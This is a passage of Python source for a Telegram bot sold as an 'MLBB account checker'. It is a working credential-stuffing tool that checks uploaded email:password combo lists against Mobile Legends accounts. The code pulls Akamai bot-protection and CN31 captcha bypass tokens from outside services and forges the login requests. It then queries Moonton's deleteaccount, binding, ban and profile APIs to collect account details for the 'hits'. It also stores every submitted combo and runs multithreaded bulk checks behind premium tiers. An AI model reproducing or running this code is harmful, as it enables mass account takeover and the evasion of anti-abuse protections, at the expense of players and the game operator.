                    referrer["referral_points"] = referrer.get("referral_points", 0) + REFERRAL_BONUS
                    referrer["ban_checks_remaining"] = referrer.get("ban_checks_remaining", FREE_BAN_DAILY) + REFERRAL_BAN_BONUS
                    user["referral_points"]     = user.get("referral_points", 0) + REFERRAL_BONUS
                    user["ban_checks_remaining"] = user.get("ban_checks_remaining", FREE_BAN_DAILY) + REFERRAL_BAN_BONUS
                    ref_applied_msg = (
                        f"\n\nReferral applied!\n"
                        f"+{REFERRAL_BONUS} free checks\n"
                        f"+{REFERRAL_BAN_BONUS} ban checks\n"
                        f"+{PREMIUM_BAN_BONUS} bulk check lines"
                    )
                    ref_name     = uname or fname or f"User{uid}"
                    ref_display  = f"@{ref_name}" if ref_name else f"User {uid}"
                    total_pts    = referrer.get("free_checks_remaining", 0) + referrer.get("referral_points", 0)
                    sep_r        = "━━━━━━━━━━━━━━━━━━━━━━━━"
                    sep2_r       = "────────────────────────"
                    asyncio.ensure_future(context.bot.send_message(
                        chat_id=int(referrer_uid),
                        text=(
                            f"{sep_r}\n"
                            f"  <b>REFERRAL USED</b>\n"
                            f"{sep_r}\n\n"
                            f"  {ref_display} used your referral link!\n\n"
                            f"{sep2_r}\n"
                            f"  <b>+{REFERRAL_BONUS}</b> free checks\n"
                            f"  <b>+{REFERRAL_BAN_BONUS}</b> ban checks\n"
                            f"  <b>+{PREMIUM_BAN_BONUS}</b> bulk check lines\n"
                            f"{sep2_r}\n\n"
                            f"  Total free checks: <b>{total_pts}</b>\n"
                            f"  Total referrals:   <b>{referrer['referral_count']}</b>"
                        ),
                        parse_mode="HTML"
                    ))
        save_db(db)

    prem       = is_premium(user)
    access_tag = " PREMIUM" if prem else " FREE"
    sep        = "━━━━━━━━━━━━━━━━━━━━━━━━"
    text = (
        f"<b>WELCOME, {fname or uname or 'User'}</b>\n"
        f"<b>MLBB ACCOUNT CHECKER</b>\n"
        f"{sep}\n\n"
        f"ACCESS: <b>{access_tag}</b>\n"
        f"{ref_applied_msg}\n\n"
        f"CHOOSE AN OPTION:"
    )
    await update.message.reply_text(
        text, parse_mode="HTML",
        reply_markup=main_menu_keyboard(uid, db)
    )
    return ConversationHandler.END

def do_ban_check(user_input, pw):
    try:
        r = requests.get(BAN_AKAMAI_API, timeout=15)
        d = r.json()
        abck = d.get("token") or d.get("abck") or d.get("_abck") or d.get("value") or d.get("data") or ""
        if not abck:
            return None, "Akamai token unavailable — try again later"
    except Exception:
        return None, "Akamai server unreachable — try again later"

    try:
        r2 = requests.get(BAN_CN31_API, timeout=15)
        d2 = r2.json()
        cn31 = d2.get("token") or d2.get("cn31") or d2.get("value") or d2.get("data") or ""
        if not cn31:
            return None, "CN31 token unavailable — try again later"
    except Exception:
        return None, "CN31 server unreachable — try again later"

    p_hash = md5(pw)
    params = {
        "account": user_input,
        "md5pwd": p_hash,
        "game_token": "",
        "recaptcha_token": "",
        "e_captcha": cn31,
        "country": "",
    }
    payload = {
        "op": "login",
        "sign": make_sign(params),
        "params": params,
        "lang": "en",
    }

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "origin": "https://mtacc.mobilelegends.com",
        "referer": "https://mtacc.mobilelegends.com/",
    })
    session.cookies.set("_abck", abck)

    try:
        r3 = session.post(MLBB_URL, json=payload, timeout=20)
        if r3.status_code in (403, 429):
            return None, "Akamai blocked — try again"
        js = r3.json()
    except Exception as e:
        return None, f"Request error: {e}"

    if js.get("sec-cp-challenge") == "true":
        return None, "Akamai challenge — try again"

    code    = js.get("code")
    message = js.get("message", "") or ""

    if code == 1013 or (message and "captcha" in message.lower()):
        return None, "Captcha error — try again"

    if code != 0:
        reason_map = {
            "account password is incorrect": "Wrong password",
            "account does not exist":        "Account not found",
            "password error":                "Wrong password",
        }
        lmsg = message.lower()
        for k, v in reason_map.items():
            if k in lmsg:
                return None, v
        return None, message if message else "Invalid credentials"

    login_data    = js.get("data") or {}
    session_token = login_data.get("session", "")
    gui           = login_data.get("guid", "")

    if not session_token:
        return None, "No session token returned"

    jwt_req  = session.post(
        "https://api.mobilelegends.com/tools/deleteaccount/getToken",
        json={"id": gui, "token": session_token, "type": "mt_And"},
        headers={"Authorization": session_token},
        timeout=20,
    )
    jwt = jwt_req.json().get("data", {}).get("jwt", "")
    if not jwt:
        return None, "No account found"

    bind_req  = session.post(
        "https://api.mobilelegends.com/tools/deleteaccount/getCancelAccountInfo",
        headers={"Authorization": f"Bearer {jwt}"},
        json={}, timeout=15,
    )
    bind_data     = bind_req.json().get("data", {})
    bindings_text = parse_binding_semi(bind_req.json())
    all_roles     = bind_data.get("all_roles", [])
    account_count = len(all_roles)

    is_banned          = False
    ban_status         = "NOT BANNED"
    ban_reason         = "-"
    ban_violation_time = "-"
    ban_expires        = "-"

    try:
        ban_req = session.post(
            "https://api.mobilelegends.com/tools/selfservice/punishList",
            headers={
                "Authorization": f"Bearer {jwt}",
                "Content-Type":  "application/x-www-form-urlencoded",
            },
            data=f"lang=en&token={session_token}",
            timeout=10,
        )
        if ban_req.status_code == 200:
            punishments = ban_req.json().get("data", [])
            if isinstance(punishments, list):
                for p in punishments:
                    if not isinstance(p, dict):
                        continue
                    reason      = str(p.get("reason", "")).strip()
                    unlock_time = str(p.get("unlock_time", "")).strip()
                    viol_time   = str(p.get("violation_time", "")).strip()
                    if reason or unlock_time:
                        is_banned          = True
                        ban_status         = "BANNED"
                        ban_reason         = reason.capitalize() if reason else "Unknown"
                        ban_violation_time = viol_time   if viol_time   else "-"
                        ban_expires        = unlock_time if unlock_time else "Permanent"
                        break
    except Exception:
        pass

    info_req  = session.post(
        "https://sg-api.mobilelegends.com/base/getBaseInfo",
        headers={"Authorization": f"Bearer {jwt}"},
        data={}, timeout=15,
    )
    info_json = info_req.json().get("data") or {}

    name      = info_json.get("name",        "Unknown")
    level     = str(info_json.get("level",   "N/A"))
    region    = info_json.get("reg_country", "N/A")
    role_id   = str(info_json.get("roleId",  "N/A"))
    zone_id   = str(info_json.get("zoneId",  "N/A"))
    guid_val  = info_json.get("guid",        gui)

    cur_rank_lv = info_json.get("rank_level", 0)
    if cur_rank_lv == 0:
        rd = info_json.get("rank", {})
        if isinstance(rd, dict):
            cur_rank_lv = rd.get("level", 0)

    hi_rank_lv = info_json.get("history_rank_level", 0)
    if hi_rank_lv == 0:
        hrd = info_json.get("historyRank", info_json.get("history_rank", {}))
        if isinstance(hrd, dict):
            hi_rank_lv = hrd.get("level", 0)

    current_rank = convert_rank_semi(cur_rank_lv)
    highest_rank = convert_rank_semi(hi_rank_lv)

    return {
        "name":               name,
        "level":              level,
        "current_rank":       current_rank,
        "highest_rank":       highest_rank,
        "bindings":           bindings_text,
        "region":             region,
        "role_id":            role_id,
        "zone_id":            zone_id,
        "guid":               guid_val,
        "account_count":      account_count,
        "is_banned":          is_banned,
        "ban_status":         ban_status,
        "ban_reason":         ban_reason,
        "ban_violation_time": ban_violation_time,
        "ban_expires":        ban_expires,
    }, None


def format_ban_result_msg(login, pw, d):
    sep       = "━━━━━━━━━━━━━━━━━━━━━━━━"
    is_banned = d["is_banned"]
    tag       = "BANNED" if is_banned else "NOT BANNED"
    lines = [
        sep,
        f"  <b>BAN CHECK — {tag}</b>",
        sep,
        "",
        f"  <b>Account :</b> <code>{login}:{pw}</code>",
        f"  <b>IGN     :</b> {d['name']}",
        f"  <b>Level   :</b> {d['level']}",
        f"  <b>Region  :</b> {d['region']}",
        f"  <b>Role ID :</b> {d['role_id']}",
        f"  <b>Zone ID :</b> {d['zone_id']}",
        f"  <b>GUID    :</b> {d['guid']}",
        f"  <b>Rank    :</b> {d['current_rank']} (Highest: {d['highest_rank']})",
        f"  <b>Bindings:</b> {d['bindings']}",
        f"  <b>Accounts:</b> {d['account_count']} on this login",
        "",
        f"  <b>Ban Status :</b> {d['ban_status']}",
    ]
    if is_banned:
        lines += [
            f"  <b>Ban Reason :</b> {d['ban_reason']}",
            f"  <b>Violation  :</b> {d['ban_violation_time']}",
            f"  <b>Expires    :</b> {d['ban_expires']}",
        ]
    lines += [
        "",
        sep,
        "  <b>NOTE:</b> This ban check is ~90% accurate.",
        "  It detects bans caused by cheat/hack tools.",
        "  It cannot detect bans via 3rd-party plugins",
        "  or manual enforcement by Moonton.",
        sep,
        "",
        "  <b>Powered by @nixzlls</b>",
    ]
    return "\n".join(lines)


async def receive_ban_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    text = (update.message.text or "").strip()

    if text.lower() in ("/cancel", "cancel"):
        context.user_data.pop("awaiting_ban", None)
        await update.message.reply_text("Cancelled.", reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("[ BACK ]", callback_data="main_menu")]]))
        return ConversationHandler.END

    if ":" not in text:
        await update.message.reply_text(
            "Invalid format. Use <code>email:password</code>",
            parse_mode="HTML")
        return AWAITING_BAN_INPUT

    parts = text.split(":", 1)
    login = parts[0].strip()
    pw    = parts[1].strip()

    if not login or not pw:
        await update.message.reply_text("Email or password cannot be empty.")
        return AWAITING_BAN_INPUT

    with data_lock:
        db   = get_db()
        user = get_user(db, uid)
        reset_ban_checks_if_needed(user)
        prem = is_premium(user)
        ban_left = user.get("ban_checks_remaining", 0)
        if not prem and ban_left <= 0:
            await update.message.reply_text(
                "━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "  <b>NO BAN CHECKS LEFT</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "  You have 0 ban checks remaining today.\n\n"
                "  • Free: 2/day (resets every 24h)\n"
                f"  • Each referral: +{REFERRAL_BAN_BONUS} ban checks\n"
                "  • Premium: unlimited ban checks\n\n"
                "  Use <b>[ REFERRAL ]</b> to earn more.",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("[ BACK ]", callback_data="back_main")]]))
            return ConversationHandler.END
        save_db(db)

    wait_msg = await update.message.reply_text(
        "Fetching tokens and checking ban status...")

    def _run():
        return do_ban_check(login, pw)

    loop = asyncio.get_event_loop()
    result, error = await loop.run_in_executor(None, _run)

    await wait_msg.delete()

    if error:
        await update.message.reply_text(
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  <b>CHECK FAILED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"  {error}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("[ TRY AGAIN ]", callback_data="ban_check")],
                 [InlineKeyboardButton("[ BACK ]",      callback_data="back_main")]]))
    else:
        with data_lock:
            db2   = get_db()
            user2 = get_user(db2, uid)
            if not is_premium(user2):
                user2["ban_checks_remaining"] = max(0, user2.get("ban_checks_remaining", 0) - 1)
            save_db(db2)
        msg = format_ban_result_msg(login, pw, result)
        await update.message.reply_text(
            msg, parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("[ CHECK ANOTHER ]", callback_data="ban_check")],
                 [InlineKeyboardButton("[ BACK ]",          callback_data="back_main")]]))

    context.user_data.pop("awaiting_ban", None)
    return ConversationHandler.END


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data  = query.data
    uid   = query.from_user.id
    uname = query.from_user.username
    fname = query.from_user.first_name

    if data == "verify_join":
        if await is_member(context.bot, uid):
            with data_lock:
                db   = get_db()
                ensure_db_keys(db)
                user = get_user(db, uid)
                user["username"]   = uname
                user["first_name"] = fname
                save_db(db)
            prem       = is_premium(user)
            access_tag = " PREMIUM" if prem else " FREE"
            sep2       = "━━━━━━━━━━━━━━━━━━━━━━━━"
            await query.edit_message_text(
                f"<b>WELCOME, {fname or uname or 'User'}</b>\n"
                f"<b>MLBB ACCOUNT CHECKER</b>\n"
                f"{sep2}\n\n"
                f"ACCESS: <b>{access_tag}</b>\n\n"
                f"CHOOSE AN OPTION:",
                parse_mode="HTML",
                reply_markup=main_menu_keyboard(uid, db)
            )
        else:
            await query.answer("You haven't joined yet!", show_alert=True)
            await send_join_prompt(query, context)
        return ConversationHandler.END

    if not await is_member(context.bot, uid):
        await send_join_prompt(query, context)
        return ConversationHandler.END

    with data_lock:
        db   = get_db()
        ensure_db_keys(db)
        user = get_user(db, uid)
        user["username"]   = uname
        user["first_name"] = fname
        save_db(db)

    sep = "━━━━━━━━━━━━━━━━━━━━━━━━"

    if data == "back_main":
        prem       = is_premium(user)
        access_tag = " PREMIUM" if prem else " FREE"
        text = (
            f"<b>WELCOME, {fname or uname or 'User'}</b>\n"
            f"<b>MLBB ACCOUNT CHECKER</b>\n"
            f"{sep}\n\n"
            f"ACCESS: <b>{access_tag}</b>\n\n"
            f"CHOOSE AN OPTION:"
        )
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard(uid, db))
        return ConversationHandler.END

    if data == "exit":
        await query.edit_message_text(" Goodbye! Use /start to return.", parse_mode="HTML")
        return ConversationHandler.END

    if data == "stop_check":
        cancel_flag[uid] = True
        await query.answer("Stopping...", show_alert=False)
        try:
            await query.edit_message_reply_markup(reply_markup=None)
        except Exception:
            pass
        return ConversationHandler.END

    if data.startswith("prescan_yes_") or data.startswith("prescan_no_"):
        parts2   = data.split("_", 3)
        action   = parts2[1]
        scan_key = parts2[2] if len(parts2) > 2 else None

        raw_combos = context.user_data.pop(f"scan_raw_{scan_key}", None)
        prem2      = context.user_data.pop(f"scan_prem_{scan_key}", False)
        chat_id2   = context.user_data.pop(f"scan_chat_{scan_key}", uid)

        if not raw_combos:
            await query.edit_message_text("Session expired. Please send your file again.", reply_markup=back_keyboard())
            return ConversationHandler.END

        sep2 = "────────────────────────"

        if action == "yes":
            with data_lock:
                db2 = get_db()
                ensure_db_keys(db2)
                db_set = set(db2["combo_database"])

            already_checked = [(lo, pw) for lo, pw in raw_combos if f"{lo}:{pw}" in db_set]
            fresh_combos    = [(lo, pw) for lo, pw in raw_combos if f"{lo}:{pw}" not in db_set]

            if already_checked:
                ac_bytes = "\n".join(f"{lo}:{pw}" for lo, pw in already_checked).encode("utf-8")
                ac_buf   = io.BytesIO(ac_bytes)
                ac_buf.name = "already_checked.txt"
                await context.bot.send_document(
                    chat_id=chat_id2,
                    document=ac_buf,
                    caption=(
                        f"<b>[ ALREADY CHECKED ]</b>\n{sep2}\n\n"
                        f"These {len(already_checked):,} account(s) are already in the database.\n"
                        f"They have been removed from your check list."
                    ),
                    parse_mode="HTML"
                )

            if not fresh_combos:
                await query.edit_message_text(
                    f"<b>[ SCAN COMPLETE ]</b>\n{sep2}\n\n"
                    f"All {len(raw_combos):,} accounts in your file are already in the database.\n"
                    f"Nothing left to check.",
                    parse_mode="HTML",
                    reply_markup=back_keyboard()
                )
                return ConversationHandler.END

            combos_to_check = fresh_combos
            removed_count   = len(already_checked)

            await query.edit_message_text(
                f"<b>[ SCAN COMPLETE ]</b>\n{sep2}\n\n"
                f"Original: {len(raw_combos):,}\n"
                f"Already checked (sent back): {removed_count:,}\n"
                f"Fresh accounts to check: <b>{len(combos_to_check):,}</b>\n\n"
                f"Now, how do you want to receive the hits?",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("One by one", callback_data="send_hits_onebyone")],
                    [InlineKeyboardButton("As .txt file", callback_data="send_hits_txt")],
                    [InlineKeyboardButton("Both", callback_data="send_hits_both")],
                ])
            )
        else:
            combos_to_check = raw_combos
            await query.edit_message_text(
                f"<b>[ {len(combos_to_check):,} ACCOUNTS LOADED ]</b>\n{sep2}\n\n"
                f"How do you want to receive the hits?",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("One by one", callback_data="send_hits_onebyone")],
                    [InlineKeyboardButton("As .txt file", callback_data="send_hits_txt")],
                    [InlineKeyboardButton("Both", callback_data="send_hits_both")],
                ])
            )

        context.user_data["pending_combos"]  = combos_to_check
        context.user_data["pending_total"]   = len(combos_to_check)
        context.user_data["pending_prem"]    = prem2
        context.user_data["pending_chat_id"] = chat_id2
        return AWAITING_CHECK_FILE

    if data in ("send_hits_onebyone", "send_hits_txt", "send_hits_both"):
        combos     = context.user_data.get("pending_combos", [])
        total_lines = context.user_data.get("pending_total", 0)
        prem       = context.user_data.get("pending_prem", False)
        chat_id    = context.user_data.get("pending_chat_id", uid)
        hit_mode   = data

        if not combos:
            await query.edit_message_text("Session expired. Please send your file again.", reply_markup=back_keyboard())
            return ConversationHandler.END

        context.user_data.pop("pending_combos", None)
        context.user_data.pop("pending_total", None)
        context.user_data.pop("pending_prem", None)
        context.user_data.pop("pending_status_id", None)
        context.user_data.pop("pending_chat_id", None)

        st_obj = {
            "valid":           0,
            "invalid":         0,
            "errors":          0,
            "checked":         0,
            "total":           total_lines,
            "banned":          0,
            "v2l_on":          0,
            "v2l_off":         0,
            "empass":          0,
            "userpass":        0,
            "start_time":      time.time(),
            "country_stats":   {},
            "rank_counts":     {},
            "top_accounts":    [],
            "collector_stats": {},
            "status_msg_id":   None,
            "valid_lines":     [],
            "ban_lines":       [],
            "v2l_on_lines":    [],
            "v2l_off_lines":   [],
            "hit_mode":        hit_mode,
        }

        stop_kb  = InlineKeyboardMarkup([[InlineKeyboardButton("STOP", callback_data="stop_check")]])
        sep2     = "────────────────────────"
        live_msg = await query.edit_message_text(
            f"{sep2}\n  <b>LIVE STATS</b>\n{sep2}\n\n"
            f"{'░' * 20} 0.0%\n\n"
            f"TOTAL: {total_lines}  CHECKED: 0/{total_lines}\n"
            f"VALID: 0   BANNED: 0   NOT: 0\n"
            f"INVALID: 0  ERROR: 0\n"
            f"ELAPSED: 0s\n\nchecking...",
            parse_mode="HTML",
            reply_markup=stop_kb
        )
        st_obj["status_msg_id"] = live_msg.message_id

        cancel_flag[uid]   = False
        stats_store[uid]   = st_obj
        chat_id_store[uid] = chat_id

        app_loop = asyncio.get_event_loop()

        with data_lock:
            db2   = get_db()
            ensure_db_keys(db2)
            user2 = get_user(db2, uid)
            user2["last_check_time"] = datetime.now().isoformat()
            save_db(db2)

        combo_strs = [f"{lo}:{pw}" for lo, pw in combos]
        with data_lock:
            db3 = get_db()
            ensure_db_keys(db3)
            existing = set(db3["combo_database"])
            for cs in combo_strs:
                if cs not in existing:
                    db3["combo_database"].append(cs)
                    existing.add(cs)
            save_db(db3)

        if prem:
            with data_lock:
                db2   = get_db()
                user2 = get_user(db2, uid)
                save_db(db2)

            def run_prem():
                run_check_job(uid, chat_id, combos, context, st_obj, app_loop, PREMIUM_THREADS, {})

            threading.Thread(target=run_prem, daemon=True).start()
        else:
            with free_queue_lock:
                is_active  = uid in free_queue_active
                queue_size = free_check_queue.qsize()

            if not is_active and queue_size == 0:
                with free_queue_lock:
                    free_queue_active.add(uid)

                with data_lock:
                    db2   = get_db()
                    user2 = get_user(db2, uid)
                    deduct_checks(user2, total_lines)
                    save_db(db2)

                def run_free():
                    run_check_job(uid, chat_id, combos, context, st_obj, app_loop, FREE_THREADS, {})

                threading.Thread(target=run_free, daemon=True).start()
            else:
                with free_queue_lock:
                    pos = free_check_queue.qsize() + 1
                free_check_queue.put((uid, chat_id, combos, st_obj, total_lines))
                await query.edit_message_text(
                    f"<b>[ QUEUED ]</b>\n{sep}\n\n"
                    f"Position: #{pos + 1}\n"
                    f"Accounts: {total_lines:,}\n\n"
                    f"You will be notified when your check starts.\n"
                    f"Upgrade to Premium to skip the queue!",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("Get Premium", callback_data="pricing")
                    ]])
                )
        return ConversationHandler.END

    if data == "check_accounts":
        reset_daily_if_needed(user)
        prem      = is_premium(user)
        free_rem  = user.get("free_checks_remaining", 0)
        ref_pts   = user.get("referral_points", 0)
        total_free = free_rem + ref_pts
        cap_info   = " Unlimited (Premium)" if prem else f" Free checks remaining: <b>{total_free}</b>"
        await query.edit_message_text(
            f"<b>[ CHECK ACCOUNTS ]</b>\n{sep}\n\n"
            f"{cap_info}\n\n"
            f"Send your combo list as a <b>.txt file</b>.\n"
            f"Format: <code>email:password</code> per line.",
            parse_mode="HTML",
            reply_markup=back_keyboard()
        )
        return AWAITING_CHECK_FILE

    if data == "semi_info":
        reset_daily_if_needed(user)
        prem      = is_premium(user)
        free_rem  = user.get("free_checks_remaining", 0)
        ref_pts   = user.get("referral_points", 0)
        total_free = free_rem + ref_pts
        cap_info   = " Unlimited (Premium)" if prem else f" Free checks remaining: <b>{total_free}</b>"
        await query.edit_message_text(
            f"<b>[ SEMI INFO CHECK ]</b>\n{sep}\n\n"
            f"{cap_info}\n\n"
            f"This uses the <b>actual MLBB API</b> directly.\n"
            f"Send your combo list as a <b>.txt file</b>.\n"
            f"Format: <code>email:password</code> or <code>user:pass</code> per line.",
            parse_mode="HTML",
            reply_markup=back_keyboard()
        )
        context.user_data["awaiting_semi_file"] = True
        return AWAITING_SEMI_EMAIL

    if data == "my_info":
        reset_daily_if_needed(user)
        reset_ban_checks_if_needed(user)
        prem    = is_premium(user)
        exp     = user.get("premium_expires")
        exp_str = "Never" if exp is None and prem else (
            datetime.fromisoformat(exp).strftime("%Y-%m-%d %H:%M") if exp else "N/A"
        )
        free_rem     = user.get("free_checks_remaining", 0)
        ref_pts      = user.get("referral_points", 0)
        total_used   = user.get("free_checks_used_total", 0)
        ref_count    = user.get("referral_count", 0)
        referred_by  = user.get("referred_by", None)
        last_check   = user.get("last_check_time", None)
        ban_left     = user.get("ban_checks_remaining", 0)
        last_check_str = datetime.fromisoformat(last_check).strftime("%Y-%m-%d %H:%M:%S") if last_check else "Never"
        bot_username = (await context.bot.get_me()).username
        ref_link     = f"https://t.me/{bot_username}?start=ref_{user.get('referral_code', 'N/A')}"
        sep2 = "────────────────────────"
        text = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  <b>MY INFO</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"User ID: <code>{uid}</code>\n"
            f"Username: @{uname or 'N/A'}\n"
            f"Access: <b>{'PREMIUM' if prem else 'FREE'}</b>\n"
        )
        if prem:
            days_left = ""
            if exp:
                delta = datetime.fromisoformat(exp) - datetime.now()
                days_left = f" ({max(0, delta.days)}d remaining)"
            text += f"Expires: {exp_str}{days_left}\n"
        text += f"\n{sep2}\n  <b>CHECK STATS</b>\n{sep2}\n\n"
        text += (
            f"Total Checked: <b>{user.get('total_checked', 0):,}</b>\n"
            f"Total Valid: <b>{user.get('total_valid', 0):,}</b>\n"
            f"Total Invalid: <b>{user.get('total_invalid', 0):,}</b>\n"
            f"Last Check: {last_check_str}\n"
        )
        if prem:
            text += (
                f"\n{sep2}\n  <b>FREE CHECK BALANCE</b>\n{sep2}\n\n"
                f"Daily Remaining: Unlimited\n"
                f"Referral Points: {ref_pts}\n"
                f"All-time Free Used: {total_used}\n"
                f"\n{sep2}\n  <b>BAN CHECK BALANCE</b>\n{sep2}\n\n"
                f"Ban Checks: Unlimited (Premium)\n"
            )
        else:
            text += (
                f"\n{sep2}\n  <b>FREE CHECK BALANCE</b>\n{sep2}\n\n"
                f"Daily Remaining: {free_rem}\n"
                f"Referral Points: {ref_pts}\n"
                f"Total Available: {free_rem + ref_pts}\n"
                f"All-time Free Used: {total_used}\n"
                f"\n{sep2}\n  <b>BAN CHECK BALANCE</b>\n{sep2}\n\n"
                f"Ban Checks Today: <b>{ban_left}</b> remaining\n"
                f"  (Resets every 24h | +{REFERRAL_BAN_BONUS} per referral)\n"
            )
        text += (
            f"\n{sep2}\n  <b>REFERRAL</b>\n{sep2}\n\n"
            f"Code: <code>{user.get('referral_code', 'N/A')}</code>\n"
            f"Link: {ref_link}\n"
            f"Invited: <b>{ref_count}</b> user(s)\n"
            f"Points from Referrals: <b>{ref_pts}</b>\n"
            f"Referred By: {'Yes' if referred_by else 'No'}\n\n"
            f"<i>Every 24h, the top inviter gets +{TOP_INVITER_BONUS} bonus checks!</i>"
        )
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=back_keyboard())
        return ConversationHandler.END

    if data == "info":
        await query.edit_message_text(INFO_TEXT, parse_mode="HTML", reply_markup=back_keyboard())
        return ConversationHandler.END

    if data == "feedback":
        await query.edit_message_text(
            f"<b>[ FEEDBACK / REPORT ]</b>\n{sep}\n\n"
            f" You can send a text message, photo, or file.\n\n"
            f"<b>WARNING:</b> Trolling or spamming may result in a <b>PERMANENT BAN</b>.\n"
            f"All feedback is logged with your identity.\n\n"
            f"Send your feedback now:",
            parse_mode="HTML",
            reply_markup=back_keyboard()
        )
        context.user_data["awaiting_feedback"] = True
        return AWAITING_FEEDBACK_MSG

    if data == "pricing":
        await query.edit_message_text(PRICING_TEXT, parse_mode="HTML", reply_markup=back_keyboard())
        return ConversationHandler.END

    if data == "ban_check":
        reset_ban_checks_if_needed(user)
        prem     = is_premium(user)
        ban_left = user.get("ban_checks_remaining", 0) if not prem else "∞"
        await query.edit_message_text(
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  <b>MLBB BAN CHECKER</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"  Ban checks remaining: <b>{ban_left}</b>\n\n"
            f"  Send your account in this format:\n"
            f"  <code>email:password</code>\n\n"
            f"  <b>⚠ NOTE:</b> This tool is ~90% accurate.\n"
            f"  Detects hack/cheat-based bans only.\n"
            f"  Cannot detect manual or plugin bans.\n\n"
            f"  Free: <b>2 checks/day</b> (resets 24h)\n"
            f"  Referral: <b>+{REFERRAL_BAN_BONUS} ban checks</b> per invite\n"
            f"  Premium: <b>unlimited</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("[ CANCEL ]", callback_data="back_main")]]))
        context.user_data["awaiting_ban"] = True
        return AWAITING_BAN_INPUT

    if data == "referral":
        bot_username = (await context.bot.get_me()).username
        ref_code     = user.get("referral_code", "N/A")
        ref_link     = f"https://t.me/{bot_username}?start=ref_{ref_code}"
        text = (
            f" <b>REFERRAL SYSTEM</b>\n{sep}\n\n"
            f"Your Code: <code>{ref_code}</code>\n"
            f"Your Link: {ref_link}\n\n"
            f" <b>How it works:</b>\n"
            f"  • Share your link with friends\n"
            f"  • When they use it, both of you get:\n"
            f"    — <b>+{REFERRAL_BONUS} free combo checks</b>\n"
            f"    — <b>+{REFERRAL_BAN_BONUS} ban checks</b>\n"
            f"    — <b>+{PREMIUM_BAN_BONUS} bulk check lines</b>\n"
            f"  • Each person can only use 1 referral (anti-abuse)\n"
            f"  • No self-referral allowed\n\n"
            f" <b>Top Inviter Bonus:</b>\n"
            f"  • Every 24h, the user with most invites\n"
            f"    receives +{TOP_INVITER_BONUS} bonus free checks!\n\n"
            f" <b>Your Stats:</b>\n"
            f"  Invited: {user.get('referral_count', 0)} users\n"
            f"  Referral Points: {user.get('referral_points', 0)}\n"
            f"  Ban Checks Left: {user.get('ban_checks_remaining', 0)}"
        )
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=back_keyboard())
        return ConversationHandler.END

    if data == "redeem_key":
        await query.edit_message_text(
            f" <b>REDEEM KEY</b>\n{sep}\n\n"
            f"Send your premium key to activate.\n"
            f"Format: <code>NIXSZ-XXXXXXXX</code>\n\n"
            f"Don't have a key? See pricing or contact @nixzlls",
            parse_mode="HTML",
            reply_markup=back_keyboard()
        )
        context.user_data["awaiting_key"] = True
        return ConversationHandler.END

    if data == "how_it_works":
        sep_h  = "━━━━━━━━━━━━━━━━━━━━━━━━"
        sep2_h = "────────────────────────"
        await query.edit_message_text(
            f"{sep_h}\n"
            f"  <b>HOW THE CHECKER WORKS</b>\n"
            f"{sep_h}\n\n"
            f"To all premium and free users —\n\n"
            f"Please check the <b>Akamai</b> and <b>CN31</b>\n"
            f"stock before you start checking.\n\n"
            f"If there is no stock, your accounts\n"
            f"will show as <b>INVALID</b> or <b>ERROR</b>.\n\n"
            f"Do not DM the admin saying the\n"
            f"checker is not working — it requires\n"
            f"CN31 and Akamai stock to function.\n\n"
            f"{sep2_h}\n\n"
            f"  <b>STOCK USAGE</b>\n\n"
            f"  1 CN31 token = 1 account\n"
            f"  1 Akamai token = 5 accounts\n\n"
            f"{sep2_h}\n\n"
            f"  <b>IF YOU GET ERRORS</b>\n\n"
            f"  Wait for stock to refill, then\n"
            f"  resend your combo file.\n\n"
            f"  Check stock using the buttons\n"
            f"  on the main menu before checking.\n\n"
            f"{sep_h}\n"
            f"  Thank you for understanding.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("[ AKAMAI STOCK ]", callback_data="akamai_stock"),
                 InlineKeyboardButton("[ CN31 STOCK ]",   callback_data="cn31_stock")],
                [InlineKeyboardButton("[ BACK ]",         callback_data="back_main")],
            ])
        )
        return ConversationHandler.END

    if data == "error_guide":
        sep_e  = "━━━━━━━━━━━━━━━━━━━━━━━━"
        sep2_e = "────────────────────────"
        ak_pool, cn_pool, ak_ok, cn_ok = fetch_stock_summary()
        ak_status = f"ONLINE — {ak_pool} stock" if ak_ok else f"LOW / OFFLINE — {ak_pool}"
        cn_status = f"ONLINE — {cn_pool} stock" if cn_ok else f"LOW / OFFLINE — {cn_pool}"
        await query.edit_message_text(
            f"{sep_e}\n"
            f"  <b>WHY AM I GETTING ERRORS?</b>\n"
            f"{sep_e}\n\n"
            f"This checker requires two external\n"
            f"services to verify each account:\n\n"
            f"{sep2_e}\n"
            f"  <b>AKAMAI</b>\n"
            f"  Bypasses Moonton's bot protection.\n"
            f"  1 Akamai token = 5 accounts.\n"
            f"  Status: {ak_status}\n\n"
            f"  <b>CN31</b>\n"
            f"  Required captcha bypass token.\n"
            f"  1 CN31 token = 1 account.\n"
